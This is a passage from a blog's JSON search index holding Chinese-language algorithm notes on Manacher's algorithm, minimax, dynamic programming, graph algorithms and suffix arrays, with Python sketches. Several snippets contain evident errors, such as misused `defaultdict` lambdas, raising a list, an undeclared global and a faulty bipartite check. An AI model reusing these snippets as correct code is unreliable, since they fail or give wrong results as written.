id=\"動機\"\u003e動機\u003c/h2\u003e","title":"Z Algorithm"},{"content":"動機 Manacher 先在每個字之間插一字元，可以把它看成mirror另一半過來 同時處理回文有兩個case(奇數長度、偶數長度)要看的問題，因為現在任何迴文都是奇數長度\n所以變成可以只追蹤一邊的長度就好，因此m[i]定義為迴文延伸出去的距離\n這樣就與z algorithm很像\n確認現在要看的回文中心，是不是在目前已確認的範圍中，如果有就先抄答案 開始延伸回文長度 如果延伸後的範圍比現在的大就更新範圍 def f(s): magic = f\u0026#39;{\u0026#34;\u0026#34;.join([\u0026#34;\u0026#34;.join(n) for n in zip(\u0026#34;#\u0026#34;*(len(s)+1), s)])}#\u0026#39; m = [0]*len(magic) def canExtend(i): left, right = i-m[i]-1, i+m[i]+1 isLegalIdx = 0 \u0026lt;= left and right \u0026lt; len(magic) return isLegalIdx and magic[left] == magic[right] C, R = 0, 0 for i in range(len(magic)): # mirror ... C ... i ... R # 只要是在範圍內就是對成就可以直接拿前面的來用 # mirror .. (C+(C-i) .. C) is part of Palindrom # mirror\u0026#39;Left .. Left .. (mirror .. R\u0026#39;).. C .. (i ~ R) is part of Palindrom if i \u0026lt; R: m[i] = min(R-i, m[C+(C-i)]) while canExtend(i): m[i]+=1 if i+m[i] \u0026gt; R: C, R = i, i+m[i] i, l = max(enumerate(m), key=lambda x: x[1]) # [i-l ~ i+l] is # a # ... a # return \u0026#39;\u0026#39;.join(c for c in magic[i-l:i+l+1] if c != \u0026#34;#\u0026#34;) print(f(\u0026#34;babbad\u0026#34;)) Ref ","permalink":"https://littlebees.github.io/2021/11/manachers-algorithm/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e","title":"Manacher's Algorithm"},{"content":"動機 minmax 在局面確定的雙人對弈裡，常進行對抗搜索，構建一棵每個節點都為一個確定狀態的搜索樹。奇數層為己方先手，偶數層為對方先手。搜索樹上每個葉子節點都會被賦予一個估值，估值越大代表我方贏面越大。\n一層從children中挑大的node，下一層就是從children中挑小的node 之後就是前序去更新上下界，如果下界大於上界就是此點不用再找了\ndef minmax(root, a, b, isMax): if not root.children: return root.val if isMax: for node in root.children: a = max(a, minmax(node, a, b, not isMax)) # 挑最大，變下界 if a \u0026gt;= b: # 不用再看了 break return a else: for node in root.children: b = min(b, minmax(node, a, b, not isMax)) # 挑最小，變上界 if a \u0026gt;= b: # 不用再看了 break return b ","permalink":"https://littlebees.github.io/2021/11/min-max%E5%B0%8D%E5%BD%B9/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e","title":"min max對役"},{"content":"動機 遞迴 貫穿演算法的重點觀念\n比起說遞迴是自己call自己，遞迴其實是\n分解問題 針對各個case處理，而每個case都是這個遞迴可以處理的 所以寫遞迴，不是去trace (這是最後的手段)\n是思考有什麼case，之後相信下一個遞迴可以把問題處理掉 之後針對各個case處理，最後生出需要的資料 千萬不要跳進這個函數里面企圖探究更多細節\n遞迴出現在各處，iteration就是recursion的特例。 同時經典演算法的重點也都是在什麼地方有遞迴，像\ntarjan的求ap或是scc的earliset，就是遞迴，從dfs延伸出去，再補back edge的訊息 kmp的fail function，就是一直往前看前面fail的有沒有與現在的字一樣的位置 bottom-up \u0026amp; top-down 遞迴有兩個方向: bottom-up \u0026amp; top-down 也對應到演算法處理問題的方式: 建構 \u0026amp; 分解(再組合) 用方向來看就是 上往下(從頭) \u0026amp; 下往上(從尾)\n如樹形DP可以考慮兩種DP順序，一種是從根到葉子，一種是從葉子到根。\n像是建tree，可以像segment tree從range去二分，或是像huffman tree把leaf一個一個合成node\n遞迴的種類 線性: List = Nil | Cons N List 樹狀: Tree = Nil | Node N Tree Tree 倍增: f(n) = f(f(i)) state: f(state1, ...) = f(state2, ...) 其他: 像河內塔 (這個反而不常用到，但不知道為什麼課本總是介紹這個) 模擬 就是照著做，但可以很簡單但也可以很痛苦\n先寫好要實現的流程 把每個部分模塊化，寫成函數、結構體或類。 對於一些可能重複用到的概念，可以統一轉化，方便處理 \u0026ldquo;YY-MM-DD 時：分\u0026rdquo; 把它抽取到一個函數，處理成秒，會減少概念混淆。 求面積時可以存邊長，需要面積時可以用算的 搜尋 與 圖論 兩個很像但關注目標截然不同\n搜尋: 重點是 目標 與 減少到目標的距離\n圖論: 重點是圖的性質\n把兩個接起來的關鍵是狀態，也就是我現在看到哪了 搜尋時的狀態，對應到圖論的點\n所以搜尋會有 剪枝與heuristic，因為就算可以看成圖，但是不同狀態變化，所生出的圖不一樣，所以重點是怎麼生圖與如何讓圖生的快一點，或是讓生出的圖變小\n圖論就是關注圖的性質，只要能用圖描述(建模)，就能從圖論的工具箱拿出許多工具，像 最短路徑、MST、network flow、SCC、CC 等\n列舉 (搜尋) 給出解空間\n有那些成分? 可能的情況是什麼？ 減少枚舉的空間\n枚舉的範圍是什麼？ 是所有的內容都需要枚舉嗎？ 有時可以透過讓列舉的維度減少 a+b=0可以列a，之後就是看-a有沒有被看過 選擇合適的枚舉順序 如果是list，可以是\n尾到頭 頭到尾 如果是數字，可以是\n大到小 小到大 等等 倍增 倍增思維\n分塊 分塊思想\n單調 在確認一個函數是否滿足單調性之前，要先能對定義域內的元素比大小，但函數的定義域並不必要是實數\n也可以說成，知道要 取 或是 捨棄 那一段區間\n單調性: 單調性指的是: 存在一個數字xx 使所有小於xx的數字都不符合條件，不小於xx的數字都符合條件。\n一個最有名的例子是binary search，另一個是two pointers\n二分搜尋與two pointer binary-search最佳實踐\n單調性與順序關係\n好用的資源 演算法筆記 cp algorithm oi-wiki 建中校內培訓講義 建中校內培訓簡報\n","permalink":"https://littlebees.github.io/2021/11/%E6%BC%94%E7%AE%97%E6%B3%95%E6%9C%83%E7%94%A8%E5%88%B0%E7%9A%84%E6%A6%82%E5%BF%B5/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e","title":"演算法會用到的概念"},{"content":"動機 寫個dp的總結，個人不喜歡課本上的什麼最佳子結構什麼的，所以不會有那種名詞 只要懂遞迴就可以做dp了\n對了，遞迴的函式預設有@cache，做記憶法\nDP概述 Dynamic programming = planning over time\n這裡的time要理解成順序，我們是在每個時間點上做決策，所以通常會需要資料有sort過或是本身有一定的順序\n這些順序就是其他講解DP的資料會看提到的階段\nDP 與 backtracking Weighted interval scheduling: 每個job有weight挑job不重疊，並讓wieght最大\n假設有job都已開始時間排序好，同時有一個函數(prev)可以給出前一個離最近的job\n那就可以給出一個dp，就是看要不要這份job f(i)表示選到i時的最大wieght總和\n@cache def f(i): if i == 0: return jobs[i] else: return max(f(i-1), jobs[i]+f(prev[i])) subset: 求subset 每一個都可以選或不選\ndef subset(arr): if not arr: return [[]] else: sub = subset(arr[1:]) return sub+[s + [arr[0]] for s in sub] 可以看出dp與backtracking都是選與不選!! 那兩者差在哪裡?\nbacktrack需要之前的所有資料 dp可以利用有結合律函數(min, max, sum\u0026hellip;)把之前的所有資料用一筆代表\n不只一種DP Weighted interval scheduling也可以這樣看\n定義f(i,time)為在選第i樣工作，從time之前都有空\ndef f(i, time): if i == 0: return jobs[i] elif end[i] \u0026gt; time: return f(i-1) else: return max(f(i-1, time), jobs[i]+f(i-1, start[i])) dp其實主要牽涉到怎麼設定狀態，像是把時間放進來，就會變成不同的dp 但前面利用前處理，讓找下一個job的速度上去，進而減少一個維度(參數)\nDP 與 greedy Greedy 不行就 DP\n當 Greedy 不對就代表 「這個問題不能只由這個子問題轉移」 換句話說，Greedy 就是可以證明只有一個轉移來源的 DP\n可以順便看列舉為什麼慢? 因為除了現在確定的參數外，還要繼續往後看才能確定答案\n貪心就是只看當下，就ok了 DP是除了現在還要加上以前的資料\n證明greedy 因為貪心就是只看當下，所以會需要證明這做法是對的\n反證法：如果交換方案中任意兩個元素/相鄰的兩個元素後，答案不會變得更好，那麼可以推定目前的解已經是最優解了。 歸納法：先算得出邊界情況（例如 ）的最優解 ，然後再證明：對於每個 ， 都可以由 推導出結果。 常見題型\n「我們將 XXX 按照某某順序排序，然後按某種順序（例如從小到大）選擇。」。 離線，先處理後選擇 「我們每次都取 XXX 中最大/小的東西，並更新 XXX。」 （有時「XXX 中最大/小的東西」可以優化，比如用優先隊列維護） 在線，邊處理邊選擇 解法 排序解法 用排序法常見的情況是輸入一個包含幾個（一般一到兩個）權值的數組，通過排序然後遍歷模擬計算的方法求出最優值。 後悔解法 思路是無論當前的選項是否最優都接受，然後進行比較，如果選擇之後不是最優了，則反悔，捨棄掉這個選項；否則，正式接受。如此往復。 DP 與 DAG DP的狀態可以看成graph上的點\n同時這個graph不會有環，所以是DAG\n這樣DP其實就是求DAG的最長/短距離\nrecursion \u0026amp; iteration iteration其實是recursion的特例\niteration，是直接從base case直接往上做，對應到bottom-up\nrecursion與iteration差在recursion要記憶當初誰call的context(用stack) 之後從頭往下，到底(base case)就照著stack往回走，這就是top-down\n如果遞迴call的當下沒有其他要做的事，其實這個遞迴就是iteration\n有context: sum(arr[1:])處理完還要與arr[0]的相加\ndef sum(arr): if not arr: return 0 else: return arr[0]+sum(arr[1:]) 沒context: sum(arr[1:],acc+arr[0])做完就沒有其他事了\ndef sum(arr,acc=0): if not arr: return acc else: return sum(arr[1:],acc+arr[0]) 所以上面那個版本其實就是iteration，不過需要tail-recursion elimiation優化才有iteration的實際效能\ntop-down \u0026amp; bottom-up top-down \u0026amp; bottom-up 不等價 Leetcode 718 如果用top-down，因為要追蹤每個range的長度，所以變成n^3 但是用bottom-up，長度自然是對的，所以變成n^2\nLeetcode 546 只能用top-down去做，因為很難確定base case與怎麼從base case長上去 反倒是top-down的分解，就很好做\n技巧 狀態壓縮 其實就是把應該用set或array表示的狀態用bitmask表示\n因為是bitmask，所以是整數，是整數就能dp\n刷表法 省mem，locality變好\nDP優化 (我不會，這個只會出現在競程) 太可怕了，就把資料列一列就好 分治、DP 進階 Aliens 優化 進階DP，DP優化\n寫的小技巧 產生新值時固定寫法 有的是f[n + x] = combine(f[n], ....) 有的是f[n] = combine(f[n - x], ....) 最好固定寫法，個人是喜歡 f[n] = combine(f[n - x], ....) 因為dp一定是由小的更新大的 bottom-up或是改寫時可以畫圖輔助 狀態怎麼到起點 (參數怎麼變化) 在table上是取什麼點 (方向) 從終點開始思考怎麼到起點 (top-down開始做) 除非bottom-up很明顯，或是top-down在這題是個悲劇 設計方式 dp就是由參數(遞迴的模型的組合)、對應的動作構成、定義回傳值，只能在求最佳化問題(有結合律的函數)使用\n遞迴的模型 線性 (1D) f(i) = combine(f(j) for j in range(i)) 區間 (2D) 列舉中點 f(i,j) = combine(combine2(f(i,k), f(k,j)) for k in range(i,j)) 控制左右 f(i,j) = combine(f(i-1,j), f(i,j-1)) 分塊 f(i,j) = combine(f(i,a), f(a,b), f(b,j)) for (a,b) in ... 點 (2D) 上、左、左上 f(i,j) = combine(f(i-1,j), f(i,j-1), f(i-1,j-1)) 樹 子樹 f(root) = combine(f(child) for child in root.children) set(狀態壓縮) f(state) = combine(f(next(state))) 上面是可能的遞迴方式，除了遞迴外，還有其他需要的訊息，像是座標、成本等等\n需要遞迴的，加上其他需要的訊息，就是dp的狀態\n動作 這就是看題目了，像是edit distance就有delete、replace、insert 動作會影響到\n子問題怎麼組合 參數怎麼變化 有什麼參數 定義回傳值 (成本) dp回來的值一定是可以與其他dp組合在一起的值，像\n最大最小 總和 長度 \u0026hellip; 通常我們會知道怎麼算最終答案的成本，但是dp時會需要計算當下狀態成本的方式，也就是需要把成本計算分散到每一層 這個吃狀態怎麼設計 以及 觀察 範例可以看Optimal binary search trees的depth怎麼處理的\n多看看其他人怎麼做 設計dp有的時候要自己加維度，就如同前面看到的dp不只一種，端看設計與實作\n所以其實寫dp最重要的是觀察與想像，所以多做題\n特別的DP 背包 01背包:\n選到i，剩下space個空間\ndef f(i,space): if space \u0026lt; 0: return float(\u0026#39;-inf\u0026#39;) elif i \u0026lt; 0: return 0 else: return max(f(i-1,space), price[i]+f(i-1, space-cost[i])) # !! 無限背包:\ndef f(i,space): if space \u0026lt; 0: return float(\u0026#39;-inf\u0026#39;) elif i \u0026lt; 0: return 0 else: return max(f(i-1,space), price[i]+f(i, space-cost[i])) # !! 滾動 \u0026amp; 從頭或從尾 注意到i都是只有i-1，所以可以用滾動，但要改寫成bottom-up\n01背包:\n這裡與原本top-down的差不多，從i往前推\ndp = [0] * W for p,w in items: for nowW in reversed(range(w, W+1)): dp[nowW] = max(dp[nowW], p+dp[nowW-w]) 無限背包:\n這裡就與top-down完全不同了!!\ntop-down還是，從i往前推，但是可以在i停留，達成無限的效果 bottom-up為了要無限，所以必須每個合法的空間都要加一次，同時還要包含前面的影響\ndp一定是小的先算好，所以一定從前面取，而現在我們想取的值是已經改變過的值，所以要從最小的空間開始往上推\n01背包是不想取到已經改變過的值，所以要從最大的空間往下推\n這裡也彰顯了從頭與從尾的不同!!\n能不能拿到已經改變過的值?\n從頭: 能 從尾: 不能 dp = [0] * W for p,w in items: for nowW in range(w, W+1): dp[nowW] = max(dp[nowW], p+dp[nowW-w]) 有環的DP 做離散化，每個點做一次 把環的長度變成兩倍 mutual recursion Leetcode 188\n最多賣k次，買完才能賣，求最大收益\nsell[i][k] = 第i天，剩k次，做賣的最大收益 buy[i][k] = 第i天，剩k次，做買的最大收益 def sell(i,k): if k \u0026lt;= 0 or i \u0026lt; 0: return 0 else: return max(sell(i-1,k), price[i]+buy(i-1,k-1)) def buy(i,k): if k \u0026lt;= 0 or i \u0026lt; 0: return float(\u0026#39;-inf\u0026#39;) else: return max(buy(i-1,k), -price[i]+sell(i-1,k-1)) 為什麼要兩個? buy有自己的收益，sell也有自己的收益 彼此又互相組成對方的收益\n範例 來自演算法課本的dp範例\nAlgorithm Design(AD): 真的難，但有點東西 Introduction to Algorithm(CLRS): 厚到不能墊泡麵與當枕頭 Algorithms(DPV): 很薄，很精闢 The Algorithm Design Manual(TADM): 就是課本，但可以根據問題屬性去查對應的解法\nedit distance replace: (i-1,j-1) delete: (i,j-1) insert: (i-1,j) insert多一個字，又馬上比對，所以與delete相反 def f(s1,s2): if not s1 and not s2: return 0 elif s1[0] == s2[0]: return f(s1[1:], s2[1:]) else: return 1+min(f(s1[1:], s2[1:]), f(s1, s2[1:]), f(s1[1:], s2)) Longest common subsequence \u0026amp; Longest increasing subsequence Longest Increasing Subsequence\nMaximum Subarray Sum (AD) Maximum Subarray Sum\nTraveling Salesman Problem 給定一系列城市和每對城市之間的距離，求訪問每一座城市一次並回到起始城市的最短迴路\ncities是還可以去的點，1011，還有2, 1, 0可以去 i是目前的位置\ndef f(cities, i): if cities == 0: return 0 else: return min([f(cities ^ (1 \u0026lt;\u0026lt; i), j) + weight[i][j] for j in edges[i] if (1 \u0026lt;\u0026lt; j) \u0026amp; cities) != 0], float(\u0026#39;inf\u0026#39;)) Hamiltonian Path 有沒有一條每一點剛好經過一次的路線，起點和終點可以不相同\nN是有幾個地點(len(graph.V()))\nremains是還可以去的點，1011，還有2, 1, 0可以去 i是目前的位置\ndef f(remains, i): if remains == 0: return True else: return any(f(remains ^ (1 \u0026lt;\u0026lt; i), j) for j in edges[i] if (1 \u0026lt;\u0026lt; j) \u0026amp; remains) != 0) Shortest paths (DPV) path本身就是一段接一段的，也就是說它本身就是遞迴\n可以回去，所謂的relaxtion，其實就是在原有的基礎上衍伸一段可以到的edge 這就是list!!\n如果求最短，就是min，是具有結合律的函數，可以dp\n所以可以列舉起、終點、中間點，一直更新最短長度\nRod cutting (CLRS) 給一條木頭，與長度對應到的價格，求最大收益\ndef f(size): if size == 0: return 0 else: return max(f(size-sub)+price for sub,price in size2price.items() if size-sub \u0026gt;= 0) Matrix-chain multiplication (CLRS, DPV) 有一排matrix要乘，求計算成本最小\n成本: (a X b) * (b X c) = (a X c) 的 成本是 b\ndef f(i,j): if j-i \u0026lt;= 1: # 不會有一個matrix相乘 return float(\u0026#39;inf\u0026#39;) else: return min(f(i,k)+f(k+1,j)+cost(k,k+1) for k in range(i+1, j-1)) Optimal binary search trees (CLRS) 給key與出現的頻率，組成一個搜尋成本最小的BST\n成本: sum(freq[i]*depth)\n一個是tree，所以要分左右 一個是範圍，所以有i,j\n再來是計算成本，所以先把depth傳進去\ndef f(i,j,dep): if j-i == 0: return 0 else: return min(f(i,k,dep+1)+f(k+1,j,dep+1)+freq[key[k]] * dep for k in range(i,j-1)) 有沒有辦法把depth消滅掉? 看成橫的 先看tree\ni i-1 i+1 i-2 i+2 再看當時遞迴的範圍\n[i-2~i+2] [i-2~i-1] [i+1~i+2] [i-2] [i+2] 以i+2來說，由上往下看被加了3次，只看遞迴時的範圍，會發現剛好都i+2出現了3次 所以可以把depth去掉，變成每一次就把整個遞迴範圍的freq加總就好\ndef f(i,j): if j-i == 0: return 0 else: return min(f(i,k)+f(k+1,j)+sum(freq[i:j]) for k in range(i,j-1)) Minimum Length Triangulation (TADM) 有一堆點，構成一個多邊形，把多邊形切成三角形，讓成本最小\n成本: 所有三角形邊長的總和\ndef dist(p1, p2): return sqrt((p1[0] - p2[0])*(p1[0] - p2[0]) + (p1[1] - p2[1])*(p1[1] - p2[1])) def cost(points, i, j, k): return dist(points[i], points[j]) + dist(points[j], points[k]) + dist(points[k], points[i]) def f(i,j): if j-i \u0026lt;= 2: return float(\u0026#39;inf\u0026#39;) elif j-i == 3: return cost(i,i+1,j) else: return min(f(i,k) + cost(i,k,j) + f(k,j) for k in range(i,j)) Independent sets in trees (DPV) Independent set就是裡面的點沒有edge互連，求最多點的set\n就是選了root就不能選children，但可以加上grand-children\nf(root) = max(sum(f(children)), 1+sum(grand-children)) Maximum Rectangle Problem (AD) 給個matrix，求從中框出的長方形的內部數字總和\n先做row的prefix sum 再根據前面的prefix sum，做每個column的prefix sum\n之後就是用排容: f(i,j,n,m) = area(i,j) - area(i-n,j) - area(i,j-m) + area(i-n, j-m)\nSegmented least squares (AD) 有一堆點，要用最少的線去fit這些點\n定義回傳值: cost\n定義cost: 每個點的e + 常數*幾根線\n用到Optimal binary search trees把depth分散到每一層去做的技巧\ndef error(i,j): # Check 6. DYNAMIC PROGRAMMING I page 30 pass def f(i): if i == 0: return 0 else: return min(error(k,i) + 常數 + f(k-1) for k in range(i)) Find the longest path in a matrix with given constraints 這裡要注意的是沒有去重的東西，所以開始dfs時要從終點開始走\ndef path(i,j): ret = float(\u0026#39;-inf\u0026#39;) if 0 \u0026lt;= i \u0026lt; n and 0 \u0026lt;= j \u0026lt; m: if (i,j) == (n-1,m-1): ret = 0 else: dirs = [(i-1,j),(i,j-1),(i+1,j),(i,j+1)] ret = max(ret, *[path(x,y) for (x,y) in dirs]) return ret for i in reversed(range(n)): for j in reversed(range(m)): path(i,j) Assembly Line Scheduling dag最長路徑\n# t :: time to switch another line # a :: time of each station # e :: cost on starting line # x :: cost on goal def f(i,j): if j == 0: return e[i] + a[i][j] ret = min(f(i,j-1), t[int(not i)][j-1]+f(int(not i), j-1)) if j == len(t[0]): # at goal ret += x[i] return ret Optimal Strategy for a Game 一開始先用一個me表示對面在做決策 有點像買股票的那一提\ndef f(i,j,me): if i\u0026gt;j: return 0 elif i==j: return arr[i] if me else 0 else: if me: # ???? return max(arr[i]+f(i+1,j,not me), arr[j]+f(i,j-1,not me)) else: # ???? Q: 看別人的分數幹嘛 A: 雖然說我們的結果與他們有關，但是他的分數與我們無關\n下面的也是類似的\ndef x(i,j): if i\u0026gt;j: return 0 elif i == j: return arr[i] else: return max(arr[i]-y(i+1,j), arr[j]-y(i,j-1)) def y(i,j): if i\u0026gt;j: return 0 elif i == j: return arr[i] else: return max(arr[i]-x(i+1,j), arr[j]-x(i,j-1)) 選下一輪能選的時候分數最少的case (關注要建構的目標)\ndef f(i,j): if i\u0026gt;j: return 0 elif i == j: return arr[i] else: return max(arr[i]+min(f(i+2, j), f(i+1,j-1)), arr[j]+min(f(i,j-2), f(i+1,j-1))) Partition problem def f(i,cnt): if i == 0: return arr[i] == cnt else: return f(i-1,cnt-arr[i]) or f(i-1,cnt) return f(len(arr)-1, sum(arr)//2) if sum(arr) % 2 == 0 else False Partition a set into two subsets such that the difference of subset sums is minimum 這個會變成backtrack\ndef f(i, cnt): if i == 0: return abs((sum(arr) - cnt) - cnt) else: return min(f(i - 1, cnt+arr[i - 1]), f(i - 1, cnt)) 原因是f想直接算差值，但是差值一定要等到最後，把所有路都走過 可以對其中一個維度做離散化\ndef f(i, cnt): if i == 0: return cnt == 0 else: return f(i-1, cnt) or f(i-1,cnt-arr[i]) for n in reversed(range(sum(arr)//2)): if f(len(arr)-1, n): print(sum(arr)-2*n) 題外話: functional DP 函数式的动态规划\nRef Greedy \u0026amp; DQ \u0026amp; DP 夜深人静写算法（二）- 动态规划入门 6. DYNAMIC PROGRAMMING I 背包 DP\n","permalink":"https://littlebees.github.io/2021/11/dynamic-programming/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e寫個dp的總結，個人不喜歡課本上的什麼最佳子結構什麼的，所以不會有那種名詞\n只要懂遞迴就可以做dp了\u003c/p\u003e\n\u003cp\u003e對了，遞迴的函式預設有\u003ccode\u003e@cache\u003c/code\u003e，做記憶法\u003c/p\u003e","title":"Dynamic programming"},{"content":"動機 tarjan的dfs好強!!\nArticulation point (tarjan的dfs) 祖先與每一棵子樹之間都有 back edge ，則此點不是關節點 祖先與其中一棵子樹之間缺少 back edge ，則此點就是關節點。\n怎麼確認祖先關係? 用dfs走每一個點，給每個經過的點都標一個時間，祖先時間一定比較小\n所以只要看每個child最遠可以到哪(earliest[child])，或是說透過back edge穿越時空，只要沒有超過祖先的時間那麼祖先一定是關節點\n但根結點沒有祖先，怎麼判斷? 有沒有一個以上的child\n接著就是怎麼找earliest earliest原定是每個child最遠可以到哪 那是怎麼走，怎麼到達下一個點? (因為這與計算最遠的定義有關) dfs，所以earliest是透過dfs遞迴定義，但還有back edge要處理\n因為是用dfs，所以earliest要確認dfs能到的最遠距離 earliest[root] = min(earliest[root], earliest[child]) 同時back edge能也走，所以要直接看他的時間，來更新earliest earliest[root] = min(earliest[root], child.time) 同時這個earliest的演算法(tarjan)，還會再求scc看到\nearliest = defaultdict(lambda x: float(\u0026#39;inf\u0026#39;)) vis = defaultdict(bool) timestamp = 1 ap = [] def setTime(root): root.time = earliest[root] = timestamp timestamp += 1 def dfs(root, fa): setTime(root) vis[root] = True cnt_of_child = sum(1 for child in root.chilren if not vis[child]) for child in [child for child in root.chilren if child is not fa]: if vis[child]: # 不在當前的dfs路徑上(back edge)，所以取時間點就好 earliest[root] = min(earliest[root], child.time) else: dfs(child, root) # 在當前的dfs路徑上，所以取越遠越好 earliest[root] = min(earliest[root], earliest[child]) if root.time \u0026lt;= earliest[child]: # child沒辦法飛超過祖先，祖先就是ap ap.append(root) if fa is None and cnt_of_child \u0026gt; 1: # root超過一個子樹 ap.append(root) def get_ap(graph): for root in graph.V(): if not vis[root]: dfs(root, None) return ap Bridge 基本與Articulation point一樣\n但現在存的是邊，所以\n不用看root是ap的case 依舊不能飛超過祖先，但是因為這是邊，所以要把剛好落在祖先的邊去掉 root.time \u0026lt;= earliest[child] =\u0026gt; root.time \u0026lt; earliest[child] earliest = defaultdict(lambda x: float(\u0026#39;inf\u0026#39;)) vis = defaultdict(bool) timestamp = 1 bri = [] def setTime(root): root.time = earliest[root] = timestamp timestamp += 1 def dfs(root, fa): setTime(root) vis[root] = True for child in [child for child in root.chilren if child is not fa]: if vis[child]: # 不在當前的dfs路徑上(back edge)，所以取時間點就好 earliest[root] = min(earliest[root], child.time) else: dfs(child, root) # 在當前的dfs路徑上，所以取越遠越好 earliest[root] = min(earliest[root], earliest[child]) if root.time \u0026lt; earliest[child]: # ap在root下面 bri.append((root,child)) def get_ap(graph): for root in graph.V(): if not vis[root]: dfs(root, None) return Connected Components 就是找相連起來的部分\nvis = defaultdict(bool) def dfs(root): ret = [] if not vis[root]: vis[root] = True for child in root.children: ret += dfs(child) return ret def cc(graph): for root in graph.V(): if not vis[root]: print(dfs(root)) Strongly Connected Components dfs走兩次，一次是順向，第二次是逆向\n順便提一下，現在google到的作法都是分兩個dfs，一個收order，另一個收scc\n但第一個dfs的order卻放在dfs最後才收，之後再reverse，去跑第二個dfs\n但其實只要把order往前放就是順序去收order了，就不用再reverse\ndef dfs(root, vis, before): if not vis[root]: vis[root] = True before(root) [dfs(child, vis, before, after) for child in root.children] def get_scc(graph): vis = [False] * len(graph.V()) order = [] for root in graph.V(): if not vis[root]: dfs(root, vis, lambda root: order.append(root)) # 把所有edge反向 graph.reverse() # 又叫transpose vis = [False] * len(graph.V()) for root in order: if not vis[root]: scc = [] dfs(root, vis, lambda root: scc.append(root)) print(scc) 另一個就是利用Articulation point的方法\n題外話，Tarjan這個方法真的神\n原本ap是看child有沒有飛過祖先來判定ap， 這裡是要scc，所以只要這個點的最早就是自己，那從這點開始的都是scc\nscc = [] vis = defaultdict(bool) earliest = defaultdict(int) def dfs(root): if not vis[root]: nodes = [root] vis[root] = True for child in root.children: if vis[child]: earliest[root] = min(earliest[root], child.time) else: nodes += dfs(child, nodes + [child]) earliest[root] = min(earliest[root], earliest[child]) if earliest[root] == root.time: scc.append(nodes) return [] else: return nodes def tarjan_scc(graph): for v in graph.V(): dfs(v) return scc Cycle 一般的cycle，用3個狀態表示沒碰過、還在dfs、處理完了 之後就是dfs\n# 0: unhandled, 1: processing, 2: done vis = defaultdict(int) def dfs(root): if vis[root] == 0: vis[root] = 1 for child in root.children: if vis[root] == 1: raise [\u0026#39;cycle\u0026#39;, root] else: dfs(child) def cycle(graph): try: for root in graph.V(): if vis[root] == 0: dfs(root) except e: print(\u0026#39;cycle exist\u0026#39;) 負環:\nBellman-Ford algorithm V個點，把E個邊，對應到的終點用邊去延伸 如果有負環，就會有到最後還可以縮小路徑的點，就會有環 Floyd-Warshall algorithm V個點 * V個點，再列舉V個點做中間點 只要有一個距離是扣到變成負的，就會有環 Bipartite 把點分成兩邊，每一點只能連到另一邊\n用bfs，去allocate所有連到的點到另一邊，之後有兩個case\nchild沒分配過 就給另一邊 child分配過了 GG side = defaultdict(lambda x: -1) def check_Bipartite(graph): q = deque() for root in graph.V(): if side[root] == -1: side[root] = 0 q.append(root) while q: child = q.popLeft() if side[child] == -1 side[child] = side[root] ^ 1 elif side[root] == side[child]: return False return True Maximum Bipartite Matching Maximum Bipartite Matching: 讓最多點被match掉\nmatch: 湊成一對，每個點不是在某一對，就是沒有在任何一對 證明、相關概念很複雜，反正就是有得match就match，或是看他能不try到別的match(argument path)，直到無法match 詳細說明看這裡\n所以可以直接用dfs一直match，每個點都try一遍\nused = defaultdict(bool) match = defaultdict(lambda x: None) def try_kuhn(root): if used[root]: return False else: used[root] = True for child in root.children: if not match[child] or try_kuhn(child): match[child] = root return True return False def lets_match(bipartile): for v in bipartile.V(): try_kuhn(v) return match 因為只是一直塞match，所以可以先做一些明顯的match\ndef lets_match(bipartile): for v in bipartile.V(): for child in v.children: if not match[child]: match[child] = root used[root] = True break for v in bipartile.V(): try_kuhn(v) return match 2-SAT 原本SAT是任意個變數or，再and 但2-SAT是只有2個變數or(item)，再and\n這樣每個item都可以用imply(a or not b)，與交換率生出兩個imply 之後構成一個imply graph\n之後就是求scc，看scc中有沒有x與not x同時在，有就是not sat\n整個時間都是在找scc，所以時間複雜度是O(V+E)\n2 - SAT\nEulerian path 歐拉路徑的條件是\ndegree為奇數的點只能是0或是2 他們就是起、終點 剩下的degree都只能是偶數 degree就是每個點有多少edge\n所以確定圖符合條件，剩下就是隨便走出一條路，之後把所有路合併起來 (為什麼要合併? 因為可能是cycle)\n實作就是用dfs在最後塞就好，自然就把所有路合併起來了\npath = [] vis = defaultdict(bool) def dfs(root): if not vis[root]: vis[root] = True for child in root.children: dfs(child) path.append(root) tree的同構 tree hash是為了判斷tree的同構，但是python可以直接用string做hash，所以可以用任何一種序的string當成key\ntrees = defaultdict(int) def post(root): if not root: return \u0026#39;\u0026#39; else: tree = f\u0026#39;{post(root.left)},{root.val},{post(root,right)}\u0026#39; trees[tree] += 1 return tree post(root) [print(tree) for tree,val in trees.items() if val \u0026gt; 1] Ref Finding articulation points in a graph in O(N+M) Finding bridges in a graph in O(N+M) Search for connected components in a graph Checking a graph for acyclicity and finding a cycle in O(M) (M就是E) Finding a negative cycle in the graph Check whether a graph is bipartite Finding strongly connected components Building condensation graph Kuhn\u0026rsquo;s Algorithm for Maximum Bipartite Matching 强连通分量 Finding the Eulerian path in O(M)\n","permalink":"https://littlebees.github.io/2021/11/%E7%A5%9E%E5%A5%87%E7%9A%84%E5%9C%96%E8%AB%96%E6%8A%80%E5%B7%A7%E9%80%B2%E9%9A%8E%E5%9C%96%E8%AB%96/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003etarjan的dfs好強!!\u003c/p\u003e","title":"神奇的圖論技巧(進階圖論)"},{"content":"動機 記錄用\nTODO: 這能幹嘛\n定義 就是一個array是map一個排名到以該數字開始的suffix\n排名就是把suffix sort過的順序\n像是[2,3,0,4,1]就是\n以2開始的suffix是第一名 以3開始的suffix是第二名 流程 concept(用到分塊與倍增):\ncounting sort 分class init:\n做counting sort (對每個字做) 分class (sort過，所以只要前後字不一樣就是不同classes) 2, 4, 8 \u0026hellip;:\n先取前半string的位置 以前半的class做counting sort 分class (前半要在同一個class，後半也要在同一個class) def count_sort(arr, kinds, f): ret = [0]*len(arr) cnts = [0]*kinds for n in arr: cnts[n] += 1 for i in range(1,kinds): cnts[i] += cnts[i-1] for i in reversed(range(len(arr))): # reversed!! cnts[arr[i]] -= 1 ret[cnts[arr[i]]] = f[i] return ret def classify(arr, p, isDiffLevel): l = [0]*len(arr) level = 0 for i in range(1,len(arr)): if isDiffLevel(i,i-1): level += 1 l[p[i]] = level return l, level+1 s = 